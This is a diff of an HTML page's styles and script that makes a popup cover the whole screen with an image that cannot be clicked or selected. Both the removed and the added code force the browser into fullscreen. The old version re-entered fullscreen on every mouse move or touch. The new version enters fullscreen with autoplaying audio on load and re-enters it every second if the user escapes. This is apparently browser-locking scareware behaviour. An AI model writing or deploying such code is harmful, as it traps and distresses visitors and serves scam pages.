@@ -8,13 +8,13 @@
     .fullscreen-popup {
       position: fixed;
       top: 0; left: 0;
-      width: 100%; height: 100%;
+      width: 100vw; height: 100vh;
       background-color: rgba(255, 255, 255);
       display: flex;
       justify-content: center;
       align-items: center;
       z-index: 9999;
-      padding: 10px;
+      padding: 0;
       box-sizing: border-box;
     }
     
@@ -33,42 +33,31 @@
     
     .popup-content {
       position: relative;
-      padding: 20px;
       background-color: #ffffff;
-      border-radius: 8px;
       text-align: justify;
-      max-width: 90vw;
-      max-height: 90vh;
-      overflow-y: auto;
-      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      width: 100vw;
+      height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
+      justify-content: center;
     }
     
     img {
-      width: 100%;
-      height: auto;
-      max-height: 80vh; /* Allow image to take most of the viewport height */
+      width: 100vw;
+      height: 100vh;
       object-fit: contain;
-      border-radius: 8px;
-      margin: 15px 0;
+      border-radius: 0;
+      margin: 0;
       user-select: none;
       pointer-events: none;
     }
     
     /* Responsive */
     @media screen and (max-width: 767px) {
-      .popup-content {
-        max-width: 95vw;
-        max-height: 95vh;
-      }
       .close-button {
         top: 5px;
         right: 5px;
-      }
-      img {
-        max-height: 70vh; /* Slightly smaller on mobile for better fit */
       }
     }
   </style>
@@ -107,45 +96,16 @@
       }
     }
 
-    let spamInterval = null;
-    let stopTimer = null;
-
-    function startSpam() {
-      if (spamInterval) return;
-      spamInterval = setInterval(() => {
-        enterFullscreen();
-      }, 600);
-    }
-
-    function stopSpam() {
-      if (spamInterval) {
-        clearInterval(spamInterval);
-        spamInterval = null;
-      }
-    }
-
-    function handleUserMove() {
-      enterFullscreen();
-
-      if (audio.paused) {
-        audio.play().catch(() => {});
-      }
-
-      startSpam();
-
-      if (stopTimer) clearTimeout(stopTimer);
-      stopTimer = setTimeout(() => {
-        stopSpam();
-      }, 2000);
-    }
-
-    window.addEventListener('mousemove', handleUserMove, { passive: true });
-    window.addEventListener('touchstart', handleUserMove, { passive: true });
-    window.addEventListener('touchmove', handleUserMove, { passive: true });
-
+    // Enter fullscreen on load and maintain it
     window.addEventListener('load', () => {
       enterFullscreen();
       audio.play().catch(() => {});
+      // Periodically check and re-enter fullscreen to ensure it persists
+      setInterval(() => {
+        if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
+          enterFullscreen();
+        }
+      }, 1000);
     });
   </script>
 
